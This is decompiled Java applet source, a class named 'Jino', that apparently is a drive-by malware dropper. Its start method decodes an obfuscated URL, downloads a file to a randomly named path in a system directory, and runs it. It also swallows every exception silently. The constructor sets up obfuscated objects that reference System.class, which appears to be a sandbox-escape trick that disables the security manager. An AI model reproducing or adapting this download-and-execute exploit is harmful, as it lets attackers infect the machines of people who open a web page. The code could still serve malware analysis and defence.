import java.util.logging.Level;
import java.util.logging.Logger;
import java.awt.Component;
import javax.swing.JList;
import java.util.HashSet;
import java.io.InputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileOutputStream;
import java.util.Random;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Jino extends Applet
{
    @Override
    public void start() {
        super.start();
        try {
            final String a = e.a("SFDK\u0005\u000b\r\u0005\u000f\f\u0003\t\u0007\f\u0007\u0003\u0018\f\u001a\u000b\u001eN]XO\fPSW{YSjCvJmEk|bX?");
            String s = e.a("");
            int n;
            int i = n = 0;
            while (i < a.length()) {
                int char1 = a.charAt(n);
                char1 -= 5;
                s += (char)char1;
                i = ++n;
            }
            final URL url = new URL(s);
            if (Boolean.valueOf(true)) {
                url.openConnection();
            }
            final InputStream openStream = url.openStream();
            String s2;
            if ((s2 = System.getProperty(e.a("ciy\u007fl~ozwi,`d{pf7|whn~nmp{d`'").replace(e.a("wd#"), e.a("")))).charAt(s2.length() - 1) != '\\') {
                s2 += e.a("\t");
            }
            final String string = s2 + e.a("y}}0") + e.a(":") + Integer.toString(new Random().nextInt(100)) + e.a(":0").concat(e.a("l0"));
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            byte[] array = new byte[153600];
            InputStream inputStream = openStream;
            int read;
            while ((read = inputStream.read(array)) > 0) {
                fileOutputStream.write(array, 0, read);
                array = new byte[153600];
                inputStream = openStream;
            }
            fileOutputStream.close();
            openStream.close();
            final Process exec;
            (exec = Runtime.getRuntime().exec(string)).waitFor();
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
        }
        catch (Exception ex) {}
    }
    
    public Jino() {
        final Class<System> clazz = System.class;
        final String replace = e.a("gp&&#tgGyv.&+tnfm$5'aazY='<ui{js\u0005'\u0004uU'").replace(e.a("$&%4"), e.a(""));
        final Object[] array = { null };
        (new Object[1])[0] = null;
        final b b = new b(clazz, replace, array);
        final HashSet<b> set = new HashSet<b>();
        new HashSet();
        set.add(b);
        this.add(new JList<Object>(new Object[] { new a(this, set) }));
        try {
            Thread.sleep(2000L);
        }
        catch (InterruptedException ex) {
            Logger.getLogger(Jino.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
